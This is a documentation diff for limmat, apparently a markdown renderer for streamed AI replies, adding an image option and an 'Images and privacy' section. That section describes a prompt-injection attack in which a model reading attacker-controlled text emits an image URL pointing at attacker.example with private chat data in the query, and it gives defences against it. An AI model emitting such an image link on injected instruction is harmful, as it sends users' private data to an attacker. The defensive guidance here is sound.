@@ -9,6 +9,7 @@ The quick start is in the [README](../README.md). Types and defaults are also in
 | `onLinkClick(href, event)` | none | Return `true` if you handled the click. limmat then calls `preventDefault()`. If it throws, the error reaches `window.onerror` and the link behaves normally. |
 | `isInternalPath(path)` | all paths | Site-relative paths (`/research/x/`) become links only if this returns `true`. Others render as plain text. It gets the raw path including any query and hash, may be called more than once per link while the reply streams, and a throw counts as `false`. Check the whole path, not just a prefix: `/research/../admin` starts with `/research/`. |
 | `allowedProtocols` | `['https', 'http', 'mailto']` | Protocols that may become links, with or without the colon and in any case. Anything else renders as plain text. |
+| `images` | `true` | `![alt](url)` becomes an `<img>` when the URL passes the link checks, limited to `http`, `https`, and site paths. An array of origins (`['https://cdn.example.com']`) loads only from those, and site paths still work. `false` shows the alt text only. `allowedProtocols` and `isInternalPath` apply too. See [Images and privacy](#images-and-privacy). |
 | `highlight(el, code, lang)` | none | Called once when a fence closes (or at `end()`), with the `<code>` element. A throw or rejection is ignored and the plain text stays. |
 | `throttleMs` | `50` | Minimum time between re-renders of the open block. `0` renders on every write. A non-finite value uses the default. |
 | `classPrefix` | `'limmat'` | Prefix of every generated class. The bundled `style.css` only styles the default prefix. |
@@ -22,6 +23,21 @@ The quick start is in the [README](../README.md). Types and defaults are also in
 - `destroy()`: remove the click listener and stop timers. The rendered DOM stays, and a render still waiting on the throttle is dropped (call `end()` first to keep it). Every later call is a no-op.
 
 `createRenderer` throws a `TypeError` if the container is not an element. Importing limmat is safe on the server, but rendering needs a DOM (for SSR use jsdom or happy-dom).
+
+## Images and privacy
+
+Images are on by default, so a reply with `![chart](https://example.com/chart.png)` shows the chart. Every `<img>` gets `loading="lazy"`, `decoding="async"`, and `referrerpolicy="no-referrer"`, so your page address is not sent along.
+
+An image loads the moment it renders, with no click. A model that reads attacker-controlled text (a web page, an email, a document) can be told to emit `![](https://attacker.example/?q=<something private from the chat>)`, and the browser then sends that to the attacker's server. limmat cannot tell a harmless image from that one. If your replies can contain private data and untrusted input together, narrow it down:
+
+```ts
+createRenderer(el, { images: ['https://cdn.example.com'] }); // only from your own host
+createRenderer(el, { images: false });                       // alt text only
+```
+
+A Content-Security-Policy `img-src` directive (for example `img-src 'self' https://cdn.example.com`) does the same job for the whole page, and also covers anything else on it. Use both if you can.
+
+Images reuse the link checks: `javascript:`, `data:`, `blob:`, and `file:` sources, `//host`, backslashes, and invisible or look-alike characters never become an `<img>`, and `allowedProtocols` can only narrow images to `https` or `http`, never widen them. A relative source needs a leading slash (`/img/a.png`), like a link. Reference-style images (`![alt][ref]`) are not supported yet. The alt text shown is the plain text of the label, and the image is not wrapped in a link. While a reply streams, the image appears when its closing `)` arrives, and the alt text shows before that.
 
 ## Code highlighting
 
@@ -44,6 +60,7 @@ div.limmat-code
   pre[tabindex=0] > code.limmat-lang-ts
 div.limmat-table-wrap[tabindex=0][role=region] > table
 a.limmat-link
+img.limmat-image[loading=lazy][decoding=async][referrerpolicy=no-referrer] (an image)
 code.limmat-inline-code (inline code)
 ```
 
